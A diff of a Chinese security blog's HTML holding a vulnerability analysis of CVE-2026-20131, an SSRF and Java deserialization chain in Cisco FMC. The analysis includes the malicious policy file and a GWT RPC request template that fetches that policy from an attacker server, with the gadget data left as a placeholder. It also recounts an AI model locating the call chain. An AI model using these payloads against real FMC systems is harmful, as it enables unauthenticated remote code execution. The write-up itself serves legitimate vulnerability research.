<span class="comment">// 🔴 如果 clientFieldNames 非 null，进入 Java 原生反序列化分支</span></span><br><span class="line">    <span class="keyword">if</span> (clientFieldNames != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">encodedData</span> <span class="operator">=</span> <span class="built_in">this</span>.readString();  <span class="comment">// 读取 Base64 编码的数据</span></span><br><span class="line">            <span class="keyword">if</span> (encodedData != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">byte</span>[] serializedData = Base64Utils.fromBase64(encodedData);</span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serializedData);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 🔴🔴🔴 Java 原生反序列化触发点！</span></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(baos);</span><br><span class="line">                <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> ois.readInt();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; ++i) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">fieldName</span> <span class="operator">=</span> (String)ois.readObject();  <span class="comment">// ← 反序列化</span></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">fieldValue</span> <span class="operator">=</span> ois.readObject();  <span class="comment">// ← 反序列化 gadget 链触发点</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> instanceClass.getDeclaredField(fieldName);</span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    field.set(instance, fieldValue);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e) &#123; ... &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException e) &#123; ... &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 继续处理普通字段 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>clientFieldNames</strong> 字段的作用就在这里了，只有指定了我们控制的类具有这个属性，才能进入java原生反序列化分支。</p>
-<hr>
-<h3 id="4-5-步骤-5-StandardSerializationPolicy-实现"><a href="#4-5-步骤-5-StandardSerializationPolicy-实现" class="headerlink" title="4.5 步骤 5: StandardSerializationPolicy 实现"></a>4.5 步骤 5: StandardSerializationPolicy 实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：com/google/gwt/user/server/rpc/impl/StandardSerializationPolicy.java</span></span><br><span class="line"><span class="comment">// 行号：52-58</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Set&lt;String&gt; <span class="title function_">getClientFieldNamesForEnhancedClass</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.clientFields == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  <span class="comment">// 没有@ClientFields 定义</span></span><br><span class="line">    &#125;</span><br><span class="line">    Set&lt;String&gt; fieldNames = <span class="built_in">this</span>.clientFields.get(clazz);</span><br><span class="line">    <span class="keyword">return</span> (fieldNames == <span class="literal">null</span>) ? <span class="literal">null</span> : </span><br><span class="line">        Collections.unmodifiableSet(fieldNames);  <span class="comment">// ← 返回字段名列表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>关键点：</strong></p>
-<ul>
-<li>如果策略文件包含 <code>@ClientFields,ClassName,...</code>，则返回非 null</li>
-<li>这会导致 <code>deserializeClass</code> 进入 Java 原生反序列化分支</li>
-</ul>
-<hr>
-<h2 id="5-利用条件"><a href="#5-利用条件" class="headerlink" title="5. 利用条件"></a>5. 利用条件</h2><table>
-<thead>
-<tr>
-<th>条件</th>
-<th>状态</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>FMC 版本 ≤ 7.6.4</td>
-<td>✅</td>
-<td>7.6.5 已删除远程加载代码</td>
-</tr>
-<tr>
-<td>目标类在策略白名单</td>
-<td>✅</td>
-<td>攻击者可控制</td>
-</tr>
-<tr>
-<td>目标类有@ClientFields 定义</td>
-<td>✅</td>
-<td>攻击者可控制</td>
-</tr>
-<tr>
-<td>commons-collections.jar 存在</td>
-<td>✅</td>
-<td>FMC 默认包含 3.2.2</td>
-</tr>
-<tr>
-<td>网络可达恶意服务器</td>
-<td>✅</td>
-<td>需要出网，设备默认配置允许</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="6-利用载荷构造"><a href="#6-利用载荷构造" class="headerlink" title="6. 利用载荷构造"></a>6. 利用载荷构造</h2><p>利用载荷构造主要有两个难点，一是生成合法的GWT RPC反序列化协议请求体格式，二是准确控制我们最后java原生反序列化链字段的位置。</p>
-<p>但exp脚本还是需要两个，一个发请求，一个作为恶意服务器返回我们自定义的策略文件。</p>
-<h3 id="6-1-策略文件结构"><a href="#6-1-策略文件结构" class="headerlink" title="6.1 策略文件结构"></a>6.1 策略文件结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.cisco.nm.vms.api.xsd.PolicyGroupEntry,true,true,true,true,com.cisco.nm.vms.api.xsd.PolicyGroupEntry/2774637291,2774637291</span><br><span class="line">@ClientFields,com.cisco.nm.vms.api.xsd.PolicyGroupEntry</span><br></pre></td></tr></table></figure>
-
-<p>事实上我们只要提供这两行内容就行，选定的 <strong>PolicyGroupEntry</strong> 类用来被GWT RPC协议进行反序列化，帮助我们将程序运行路径引导到 java 原生反序列化上。</p>
-<h3 id="6-2-GWT-RPC-请求格式"><a href="#6-2-GWT-RPC-请求格式" class="headerlink" title="6.2 GWT RPC 请求格式"></a>6.2 GWT RPC 请求格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7|0|7|http://192.168.209.237:9999/internal/|pIcP1i2QxZqv|com.cisco.nm.vms.rpc.assignment.AssignmentRPC|getPFSettingsAssignmentsByDevices|com.cisco.nm.vms.api.xsd.PolicyGroupEntry/2862795633|com.cisco.nm.vms.api.xsd.PolicyGroupEntry/2862795633|(base64 payload)|1|2|3|4|1|5|6|7|8|9|</span><br></pre></td></tr></table></figure>
-
-<p>上面是具体的payload内容，进行具体拆解就是以下结构：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version, flag, string_count, (string table), (indexes and param_num)</span><br></pre></td></tr></table></figure>
-
-<p>其中version表示当前GWT RPC协议版本号，固定为7，flag暂时没理解具体含义，值为0，1，2 中的一个，决定部分控制流走向，我们这里需要为0。string_count 表示 string table 中字段的个数，用来标识后面的索引从哪开始。</p>
-<p>最重要的string table，其中存放的内容需要和后面的索引所对应，索引的字段含义和顺序是固定的，所以最好把这部分也固定，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module_base_url,strong_name,service,method,policyGroupEntry_sig,policyGroupEntry_sig,encoded_data,</span><br></pre></td></tr></table></figure>
-
-<p>索引部分对应上面的顺序，但是多了一个param_count字段：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_base_url,strong_name,service,method,paramCount，policyGroupEntry_sig,policyGroupEntry_sig,encoded_data,</span><br><span class="line">       1              2        3       4       1              5                       6               7    </span><br></pre></td></tr></table></figure>
-
-<p>各字段的值需要跟着整个漏洞执行路径来梳理。</p>
-<h3 id="6-4-完整链路分析"><a href="#6-4-完整链路分析" class="headerlink" title="6.4 完整链路分析"></a>6.4 完整链路分析</h3><p>请求进入后端之后，通过 <code>com.google.gwt.user.server.rpc.RPC#decodeRequest</code> 方法对请求体进行解析：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401103934184.png" alt="解析流程"></p>
-<p>解析前，会先把我们输入的请求体读取出来，按照协议格式进行组织：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401104905165.png" alt="请求体解析"></p>
-<p>通过 <code>deserializeStringTable()</code> 方法，我们输入的payload会被按照 “|” 来分割成各个字符串，存入表中：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401105242058.png" alt="字符串表"></p>
-<p>表中的内容放的就是 <code>(string table)</code> 中的内容。之后每次遇到 <strong><code>this.readString();</code></strong> 方法的时候，就会顺序从 <code>(indexes and param_num)</code> 中读取索引，来上面这个table中找对应的字符串。</p>
-<p>比如112和113行，就从表中读取了我们最开始指定的moduleBaseURL和strongName两个值，并通过这两个值，组成策略加载地址：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401110549981.png" alt="策略加载"></p>
-<p>如果我们指定的strongName在本地找不到，就会组合moduleBaseURL去远程查找，所以我们在这里只要随机给一个strongName的值别和本地的记录相撞就可以进入这条分支。</p>
-<p>在读取到我们的恶意策略并加载之后，会继续解析我们的payload：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401112333869.png" alt="继续解析"></p>
-<p>这里通过标红的地方，又分别用 <code>readString()</code> 来读取了4个token，分别对应 service,method,paramCount 和 policyGroupEntry_sig。</p>
-<p>根据这里 paramCount 的值会向后再以此读取出各个参数的类型。这部分读这几个值的意义在于，类似java反射，需要指定你要调用哪个接口，接口的哪个方法，方法的参数个数，具体参数的类型。</p>
-<p>接着针对各个参数，通过 <code>deserializeValue</code> 方法来反序列化它们的值：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401112733329.png" alt="反序列化参数"></p>
-<p>该方法有两个分支：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401113008157.png" alt="分支判断"></p>
-<p>实际上就是根据<strong>参数类型</strong>调用不同的<strong>读取方法</strong>，关键是OBJECT类型，它调用的 <code>readObject</code> 方法，最终会通过托底策略调用java原生反序列化方法来反序列化它的值。</p>
-<p>所以我们这里就注意到两个条件：</p>
-<p>​	① 指定接口的方法需要有至少一个参数</p>
-<p>​	② 参数不能是基本类型</p>
-<p>继续往下看，这个 <code>readObject</code> 方法又通过 <code>getString()</code> 方法读取了一个table中的字段：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401113511494.png" alt="readObject"></p>
-<p>也因此，虽然前面我只指定了一个参数数目，但是紧接着我填充了两个参数类型字段 <code>policyGroupEntry_sig,policyGroupEntry_sig</code>，为了能够通过这里的检查，从而进入下面的else分支继续反序列化。</p>
-<p>进入 <code>deserialize</code> 方法当中，会对参数类型进行一次检查，主要是为了确认反序列化的目标和本地计算的GWT签名是否一致：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401114151710.png" alt="签名检查"></p>
-<p>“&#x2F;&#x2F;“ 之后的数字即为签名，这也是一个比较麻烦的点，不同版本的签名不同，这个签名是通过 <code>SerializabilityUtil#getSerializationSignature</code> 计算出来的，而且还受到策略文件中的相关定义的影响。</p>
-<p>随后进入 <code>deserializeImpl()</code> 方法继续反序列化，进入之前会对反序列化目标检查是否在白名单中，但是无所谓，毕竟白名单是我们自己提供的。这也是这个漏洞的核心点。</p>
-<p><img src="/images/CVE-2026-20131/image-20260401114814429.png" alt="白名单检查"></p>
-<p>在 <code>deserializeImpl</code> 方法中，又遇到一个分支，其中要求 <code>customSerializer</code> 为null 才能进入我们的目标分支中的 <code>deserializeClass</code> 方法：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401114953045.png" alt="customSerializer检查"></p>
-<p>这个 <code>customSerializer</code> 就是某个类型专用的自定义反序列化器，用来替代默认的按字段反序列化逻辑。举个例子，比如 LogRecord 这个类，他就实现了自己的反序列化器 <code>LogRecord_CustomFieldSerializer</code>：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401155509711.png" alt="自定义序列化器"></p>
-<p>所以这里对我们的payload就有额外的要求：</p>
-<p>​	③ 指定的接口方法的参数不能存在自定义的反序列化器</p>
-<p>满足条件后进入 <code>deserializeClass()</code> 方法：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401155915287.png" alt="deserializeClass"></p>
-<p>可以看到这里334行存在 java 原生反序列化入口，而且反序列化对象为泛型Object，数据来自 <code>encodedData</code>，同样是通过 <code>readString()</code> 方法从我们的payload中读取出来，由我们控制。</p>
-<p>同时，发现依赖库里刚好有存在可利用的反序列化链版本的jar包，即可造成完整利用链。</p>
-<p>但是这里还有一个约束：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clientFieldNames != <span class="literal">null</span>) &#123;</span><br></pre></td></tr></table></figure>
-
-<p>要求 <code>clientFieldNames</code> 变量不能为null，这里的 <code>clientFieldNames</code> 是从反序列化策略里来的，刚好策略也是我们提供的，所以也能控制。该变量的意思就是策略里目标类 <code>instanceClass</code> 指定了哪些字段（成员变量）可以反序列化。</p>
-<p>所以我们必须在策略文件中指定：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.cisco.nm.vms.api.xsd.PolicyGroupEntry,true,true,true,true,com.cisco.nm.vms.api.xsd.PolicyGroupEntry/2774637291,2774637291</span><br><span class="line">@ClientFields,com.cisco.nm.vms.api.xsd.PolicyGroupEntry</span><br></pre></td></tr></table></figure>
-
-<p>事实上只要带上 <code>@ClientFields</code> 这个头就好了，具体指定哪些字段无所谓，但是这会影响之前说的针对这个类的GWT签名，所以我这里就从简，啥也不指定，也能保证 <code>clientFieldNames</code> 不为null。</p>
-<p>最后要注意的一点是：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401163646699.png" alt="readInt"></p>
-<p>这里又通过 <code>readInt()</code> 方法来读取了一个索引，含义就是前面说的目标类的字段（成员变量）数目，这里只要保证能进入for循环就行了，最后的索引随便加个数就行。</p>
-<hr>
-<h2 id="7-漏洞利用条件总结"><a href="#7-漏洞利用条件总结" class="headerlink" title="7. 漏洞利用条件总结"></a>7. 漏洞利用条件总结</h2><p>回顾一下我们漏洞利用需要的三个条件：</p>
-<p>​	① 指定接口的方法需要有至少一个参数</p>
-<p>​	② 参数不能是基本类型</p>
-<p>​	③ 指定的接口方法的参数不能存在自定义的反序列化器</p>
-<p>其中，接口就是我们可以访问的目标类：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401160649319.png" alt="接口定义"></p>
-<p>接口中定义了一些方法：</p>
-<p><img src="/images/CVE-2026-20131/image-20260401160811647.png" alt="方法定义"></p>
-<p>根据上面的三个条件，很快锁定了符合我们要求的一个接口和它的带参方法：</p>
-<ul>
-<li>接口：<code>com.cisco.nm.vms.rpc.assignment.AssignmentRPC</code></li>
-<li>方法：<code>getPFSettingsAssignmentsByDevices</code></li>
-<li>参数：<code>com.cisco.nm.vms.api.xsd.PolicyGroupEntry</code></li>
-</ul>
-<p>由此构成我们最终的payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7|0|7|baseURL|strongname|com.cisco.nm.vms.rpc.assignment.AssignmentRPC|getPFSettingsAssignmentsByDevices|com.cisco.nm.vms.api.xsd.PolicyGroupEntry/2862795633|com.cisco.nm.vms.api.xsd.PolicyGroupEntry/2862795633|(base64 payload)|1|2|3|4|1|5|6|7|8|9|</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="8-官方修复（7-6-5）"><a href="#8-官方修复（7-6-5）" class="headerlink" title="8. 官方修复（7.6.5）"></a>8. 官方修复（7.6.5）</h2><ul>
-<li>删除了 <code>AbstractRPCImpl.doGetSerializationPolicy</code> 中的远程加载代码</li>
-<li>只允许从本地文件系统加载策略文件</li>
-</ul>
-<hr>
-<h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h2><h3 id="9-1-漏洞亮点"><a href="#9-1-漏洞亮点" class="headerlink" title="9.1 漏洞亮点"></a>9.1 漏洞亮点</h3><ol>
-<li><strong>组合漏洞</strong> - SSRF + 反序列化，绕过单一防护</li>
-<li><strong>官方 gadget</strong> - 使用 GWT 和 CommonsCollections 的合法功能</li>
-<li><strong>隐蔽性强</strong> - 策略文件加载看起来是正常功能</li>
-</ol>
-<h3 id="9-2-AI-使用心得"><a href="#9-2-AI-使用心得" class="headerlink" title="9.2 AI 使用心得"></a>9.2 AI 使用心得</h3><p>这个漏洞复现，可以说除了payload是我自己调试一点点拼出来的，其他都是AI做的，包括定位漏洞位置，发现漏洞调用链（实际上从解析我们的payload开始到最后进入java原生反序列化的调用链路可以发现，它还是很长的，跨了很多个方法，中间还有不少需要我们控制的分支）。</p>
-<p>不过中间也没有太多复杂的调用方式，静态分析工具应该也能找到，但是深度需要很深，估计要跑好久。用大模型自己找反而一会就找到了。</p>
-<p>但是，虽然找到这条链，构造payload的过程大模型基本抓瞎，可能是约束条件太多了，它没法一下考虑那么多，也可能是理解 GWT 反序列化过程太复杂，总之不管怎么和大模型聊，指正它的行为，最后写出的payload还是问题不少。</p>
-<p>特别是，这条payload还很特殊，比如最后的方法参数部分，明明就只指定了一个方法参数，后面却重复的跟了两个参数类型字段，就是为了控制程序按指定控制流走，这一点可能在实际的业务流中是不太可能存在的情况，但是漏洞利用就是钻了这个空子。</p>
-<p>要是按照常规的对GWT反序列化的经验和知识，为了保证所谓的”符合GWT反序列化协议规范”，大模型只会构造出”合规”的payload，但是就无法满足漏洞利用要求。</p>
-<p>payload能成功构造还是少不了调试过程中根据调试信息不断试错，大模型似乎现在也没法像人一样进行调试？所以这也是一个难点吧。</p>
-
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Yayin\'s Blog',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about"><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Yayin's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about"><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="site-info"><h1 id="site-title">Yayin's Blog</h1><div id="site_social_icons"><a class="social-icon" href="https://github.com/Yayin222" target="_blank" title=""><i class="github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2026/04/01/CVE-2026-20131-%E5%AE%8C%E6%95%B4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" title="CVE-2026-20131 完整漏洞利用分析报告">CVE-2026-20131 完整漏洞利用分析报告</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2026-04-01T09:12:00.000Z" title="发表于 2026-04-01 17:12:00">2026-04-01</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="content">CVE-2026-20131 完整漏洞利用分析报告1. 漏洞概述1.1 基本信息   项目 内容    CVE 编号 CVE-2026-20131   受影响产品 Cisco Firepower Management Center (FMC)   受影响版本 7.6.4 及之前版本（7.6.5 已修复）   漏洞类型 SSRF + 反序列化漏洞组合   CVSS 评分 预计 9.8 (Critical)   1.2 漏洞本质这是一个组合漏洞，由两个独立但相互关联的问题组成：  SSRF（服务端请求伪造） - FMC 会从攻击者控制的 URL 加载 GWT RPC 序列化策略文件 不安全反序列化 - 策略文件可配置启用 Java 原生反序列化，触发 CommonsCollections gadget 链  1.3 攻击效果 ✅ 任意命令执行（RCE） ✅ 以 Tomcat 进程权限运行（通常为 root） ✅ 无需认证（部分接口）   2. 漏洞位置2.1 核心文件1234567891011121314FMC 文件系统路径:/var/opt/CSCOpx/MDC/tomcat/we...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2026/04/01/hello-world/" title="Hello World">Hello World</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2026-04-01T09:05:31.356Z" title="发表于 2026-04-01 17:05:31">2026-04-01</time></span></div><div class="content">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Yayin</div><div class="author-info-description">专注于代码审计和漏洞挖掘的技术博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Yayin222" target="_blank" title=""><i class="github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/01/CVE-2026-20131-%E5%AE%8C%E6%95%B4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" title="CVE-2026-20131 完整漏洞利用分析报告">CVE-2026-20131 完整漏洞利用分析报告</a><time datetime="2026-04-01T09:12:00.000Z" title="发表于 2026-04-01 17:12:00">2026-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/01/hello-world/" title="Hello World">Hello World</a><time datetime="2026-04-01T09:05:31.356Z" title="发表于 2026-04-01 17:05:31">2026-04-01</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><span class="card-category-list-name">漏洞分析</span><span class="card-category-list-count">1</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 1.1em; color: #999">CVE</a> <a href="/tags/Cisco-FMC/" style="font-size: 1.1em; color: #999">Cisco FMC</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.1em; color: #999">反序列化</a> <a href="/tags/RCE/" style="font-size: 1.1em; color: #999">RCE</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
       
     </div>
-    <footer class="article-footer">
-      <a data-url="https://yayin222.github.io/2026/04/01/CVE-2026-20131-%E5%AE%8C%E6%95%B4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" data-id="cuidyZQDJbmkf_y5fFhQ1CPVG" data-title="CVE-2026-20131 完整漏洞利用分析报告" class="article-share-link"><span class="fa fa-share">分享</span></a>
+  
+    <ul class="card-archive-list">
       
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Cisco-FMC/" rel="tag">Cisco FMC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/04/01/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2026-04-01T09:05:31.356Z" itemprop="datePublished">2026-04-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/04/01/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
